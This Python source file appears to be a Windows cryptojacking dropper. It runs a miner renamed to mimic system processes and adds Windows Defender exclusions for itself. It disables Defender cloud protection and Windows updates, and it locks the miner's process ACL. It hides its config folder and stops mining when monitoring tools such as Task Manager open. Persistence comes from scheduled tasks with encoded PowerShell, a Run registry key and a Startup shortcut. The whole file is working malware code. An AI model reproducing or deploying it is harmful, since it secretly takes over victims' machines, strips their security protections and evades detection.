def protect_process(pid):
    try:
        import win32security, win32api, win32process
    except ImportError:
        hawk.warning("[PROCESS_PROTECT] pywin32 not installed, skipping ACL protection")
        return
    try:
        hProcess = win32api.OpenProcess(win32process.PROCESS_SET_SECURITY, False, pid)
        admins, _, _ = win32security.LookupAccountName("", "Administrators")
        system, _, _ = win32security.LookupAccountName("", "SYSTEM")
        dacl = win32security.ACL()
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, admins)
        dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32process.PROCESS_TERMINATE, system)
        win32security.SetSecurityInfo(hProcess, win32security.SE_KERNEL_OBJECT,
                                      win32security.DACL_SECURITY_INFORMATION,
                                      None, None, dacl, None)
        hawk.info("[PROCESS_PROTECT] only admins/system can terminate miner")
    except Exception as e:
        hawk.error(f"[PROCESS_PROTECT] failed: {e}")

def _set_volatile_pause_flag():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        winreg.SetValueEx(key, "MinerPaused", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def _clear_volatile_pause_flag():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment", 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, "MinerPaused")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except:
        pass

def _is_volatile_pause_flag_set():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Volatile Environment")
        try:
            val, _ = winreg.QueryValueEx(key, "MinerPaused")
            winreg.CloseKey(key)
            return val == 1
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

class MinerWatchdog:
    def __init__(self, exe_path, config_dir, base_threads=None):
        self.exe_path = exe_path
        self.config_dir = config_dir
        self.config_path = os.path.join(config_dir, 'config.json')
        self.base_threads = base_threads or max(1, round(os.cpu_count() * 0.15))
        self.current_threads = self.base_threads
        self.miner_proc = None
        self.running = True
        self.lock = threading.Lock()

    def start(self):
        time.sleep(random.randint(30, 120))
        self._launch_miner()
        threading.Thread(target=self._watchdog_loop, daemon=True).start()

    def _launch_miner(self):
        if self.miner_proc and self.miner_proc.poll() is None:
            self.miner_proc.terminate()
            self.miner_proc.wait()
        try:
            config = json.load(open(self.config_path))
        except:
            hawk.warning("[WATCHDOG] config missing or corrupted, regenerating")
            generate_config(self.config_dir, self.current_threads)
            config = json.load(open(self.config_path))
        config['cpu']['max-threads-hint'] = self.current_threads
        with open(self.config_path, 'w') as f:
            json.dump(config, f, indent=2)
        if not _verify_exclusion(self.exe_path):
            hawk.warning(f"[WATCHDOG] miner not in exclusion list, re-adding")
            add_folder_to_defender_exclusions(self.exe_path)
        if not _verify_exclusion(self.config_dir):
            hawk.warning(f"[WATCHDOG] config dir not in exclusion list, re-adding")
            add_folder_to_defender_exclusions(self.config_dir)
        self.miner_proc = subprocess.Popen(
            [self.exe_path, f"--config={self.config_path}"],
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        protect_process(self.miner_proc.pid)
        hawk.info(f"[WATCHDOG] miner launched with {self.current_threads} threads, PID {self.miner_proc.pid}")

    def _check_for_snooping(self):
        SUSPICIOUS_PROCS = {'taskmgr.exe', 'procexp.exe', 'perfmon.exe', 'resmon.exe', 'procmon.exe', 'processhacker.exe'}
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() in SUSPICIOUS_PROCS:
                    return True
        except:
            pass
        return False

    def _watchdog_loop(self):
        while self.running:
            if not os.path.exists(self.exe_path):
                hawk.warning("[WATCHDOG] Miner executable missing, attempting recovery...")
                new_exe = find_miner_exe()
                if new_exe:
                    self.exe_path = new_exe
                    hawk.info(f"[WATCHDOG] Recovered miner at {self.exe_path}")
                else:
                    hawk.critical("[WATCHDOG] Cannot recover miner, exiting.")
                    self.running = False
                    break

            if self.miner_proc.poll() is not None:
                hawk.warning("[WATCHDOG] Miner crashed, restarting")
                self._launch_miner()

            if self._check_for_snooping():
                hawk.critical("[WATCHDOG] User snooping detected! Stopping miner until next reboot.")
                if self.miner_proc and self.miner_proc.poll() is None:
                    self.miner_proc.terminate()
                _set_volatile_pause_flag()
                self.running = False
                break

            cpu_percent = psutil.cpu_percent(interval=2)
            if cpu_percent > 30 and self.current_threads > 1:
                self.current_threads = max(1, self.current_threads - 1)
                hawk.info(f"[WATCHDOG] CPU high ({cpu_percent}%), reducing threads to {self.current_threads}")
                self._launch_miner()
            elif cpu_percent < 15 and self.current_threads < self.base_threads * 2:
                self.current_threads += 1
                hawk.info(f"[WATCHDOG] CPU low ({cpu_percent}%), increasing threads to {self.current_threads}")
                self._launch_miner()

            time.sleep(10)

def create_scheduled_task():
    if not ENABLE_PERSISTENCE:
        hawk.info("[PERSISTENCE] disabled")
        return
    hawk.info("[PERSISTENCE] creating logon scheduled task for watchdog script")
    try:
        task_name = "WindowsHelperTask"
        script_path = os.path.abspath(sys.argv[0])
        python_exe = sys.executable
        subprocess.run([
            'schtasks', '/create', '/tn', task_name,
            '/tr', f'"{python_exe}" "{script_path}"',
            '/sc', 'onlogon', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] logon task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] logon task failed: {e}", exc_info=True)

    hawk.info("[PERSISTENCE] creating watchdog scheduled task (runs every 5 minutes)")
    try:
        task_name_watchdog = "WindowsHelperWatchdog"
        script_path = os.path.abspath(sys.argv[0])
        python_exe = sys.executable
        ps_script = f'''$proc = Get-Process -Name python | Where-Object {{ $_.Path -eq '{python_exe}' }} | Select-Object -First 1; if (-not $proc) {{ Start-Process -FilePath '{python_exe}' -ArgumentList '"{script_path}"' -WindowStyle Hidden }}'''
        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        subprocess.run([
            'schtasks', '/create', '/tn', task_name_watchdog,
            '/tr', f'powershell -EncodedCommand {b64}',
            '/sc', 'minute', '/mo', '5', '/rl', 'HIGHEST', '/f'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] watchdog task created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] watchdog task failed: {e}", exc_info=True)

def add_persistence_multi():
    script_path = os.path.abspath(sys.argv[0])
    python_exe = sys.executable
    target = f'"{python_exe}" "{script_path}"'

    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        hawk.info("[PERSISTENCE] Registry Run key added")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] Registry Run key failed: {e}")

    try:
        startup_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_dir, "WindowsHelper.lnk")
        ps_cmd = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')
$Shortcut.TargetPath = '{python_exe}'
$Shortcut.Arguments = '"{script_path}"'
$Shortcut.WindowStyle = 7
$Shortcut.Save()
'''
        b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        subprocess.run(['powershell', '-EncodedCommand', b64], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        hawk.info("[PERSISTENCE] Startup shortcut created")
    except Exception as e:
        hawk.error(f"[PERSISTENCE] Startup shortcut failed: {e}")

def run_payload():
    if _is_volatile_pause_flag_set():
        hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
        sys.exit(0)

    exe_path, config_dir = check_previous_deployment()
    if exe_path:
        print("Script has already been deployed before")
        hawk.info("[MAIN] Previous deployment detected, using existing miner")
        disable_defender_cloud()
        disable_windows_updates()

        if os.path.basename(exe_path).lower() == f"{EXE_NAME.lower()}.exe":
            hawk.info("[MAIN] Original miner name detected, renaming and generating config...")

            try:
                exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
                if not exe_names:
                    exe_names = ["RuntimeBroker.exe"]
                running_procs = set()
                try:
                    tasklist_out = subprocess.run(
                        'tasklist /fo csv /nh', capture_output=True, text=True,
                        shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
                    ).stdout.lower()
                    for line in tasklist_out.splitlines():
                        parts = line.split('","')
                        if parts:
                            img = parts[0].strip('"').lower()
                            if img:
                                running_procs.add(img)
                except:
                    pass
                available_names = [n for n in exe_names if n.lower() not in running_procs]
                if not available_names:
                    available_names = exe_names
                new_name = random.choice(available_names)
                new_exe_path = os.path.join(os.path.dirname(exe_path), new_name)
                os.rename(exe_path, new_exe_path)
                add_folder_to_defender_exclusions(new_exe_path)
                hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")

                if not os.path.isdir(config_dir):
                    config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
                                              "Microsoft", "Windows", "Themes", "CachedFiles")
                    os.makedirs(config_dir, exist_ok=True)
                generate_config(config_dir)

                for lp in LOCK_PATHS:
                    if os.path.isfile(lp):
                        try:
                            with open(lp, 'r') as f:
                                lines = f.read().strip().splitlines()
                            if len(lines) >= 1 and os.path.basename(lines[0].strip()).lower() == f"{EXE_NAME.lower()}.exe":
                                with open(lp, 'w') as lf:
                                    lf.write(f"{new_exe_path}\n{config_dir}")
                        except:
                            pass

                exe_path = new_exe_path
            except Exception as e:
                hawk.error(f"[RENAME] rename failed: {e}. Will continue with original name.")

        else:
            if not os.path.isfile(os.path.join(config_dir, 'config.json')):
                generate_config(config_dir)

        watchdog = MinerWatchdog(exe_path, config_dir)
        watchdog.start()
        hawk.info("[WATCHDOG] started")
        create_scheduled_task()
        add_persistence_multi()
        try:
            while watchdog.running:
                time.sleep(1)
        except KeyboardInterrupt:
            hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
        finally:
            if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
                watchdog.miner_proc.terminate()
            hawk.info("[MAIN] exiting")
        sys.exit(0)

    disable_defender_cloud()
    disable_windows_updates()

    miner_exe = find_miner_exe()
    if not miner_exe:
        hawk.critical("[PAYLOAD] miner executable not found on disk, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Miner exe not found")
    if not is_pe_file(miner_exe):
        hawk.critical("[PAYLOAD] file is not a valid PE, aborting")
        trigger_exit(ERR['UNEXPECTED'], "Invalid PE file")

    hawk.info("[RENAME] selecting new name for miner")
    try:
        exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
        if not exe_names:
            exe_names = ["RuntimeBroker.exe"]
        running_procs = set()
        try:
            tasklist_out = subprocess.run(
                'tasklist /fo csv /nh', capture_output=True, text=True,
                shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
            ).stdout.lower()
            for line in tasklist_out.splitlines():
                parts = line.split('","')
                if parts:
                    img = parts[0].strip('"').lower()
                    if img:
                        running_procs.add(img)
        except:
            pass
        available_names = [n for n in exe_names if n.lower() not in running_procs]
        if not available_names:
            available_names = exe_names
        new_name = random.choice(available_names)
        new_exe_path = os.path.join(os.path.dirname(miner_exe), new_name)
        os.rename(miner_exe, new_exe_path)
        add_folder_to_defender_exclusions(new_exe_path)
        hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")
        miner_exe = new_exe_path
    except Exception as e:
        hawk.error(f"[RENAME] rename failed: {e}. Will continue with original name.")

    config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
                              "Microsoft", "Windows", "Themes", "CachedFiles")
    os.makedirs(config_dir, exist_ok=True)
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(config_dir, FILE_ATTRIBUTE_HIDDEN)
    add_folder_to_defender_exclusions(config_dir)

    generate_config(config_dir)

    watchdog = MinerWatchdog(miner_exe, config_dir)
    watchdog.start()
    hawk.info("[WATCHDOG] started")

    create_scheduled_task()
    add_persistence_multi()

    new_lock = random.choice(LOCK_PATHS)
    for lp in LOCK_PATHS:
        if os.path.isfile(lp) and lp != new_lock:
            try:
                os.remove(lp)
            except:
                pass
    os.makedirs(os.path.dirname(new_lock), exist_ok=True)
    with open(new_lock, 'w') as lf:
        lf.write(f"{miner_exe}\n{config_dir}")

    hawk.info("[PAYLOAD] watchdog running, persistence established")
    try:
        while watchdog.running:
            time.sleep(1)
    except KeyboardInterrupt:
        hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
    finally:
        if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
            watchdog.miner_proc.terminate()
        hawk.info("[MAIN] exiting")
        sys.exit(0)

def main():
    hawk.info(f"[MAIN] start, PID={os.getpid()}")
    if not is_admin():
        hawk.info("[MAIN] elevating")
        elevate()
    if not is_admin():
        hawk.critical("[MAIN] still not admin after elevation attempt")
        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")
    add_self_to_defender_exclusions()
    run_payload()

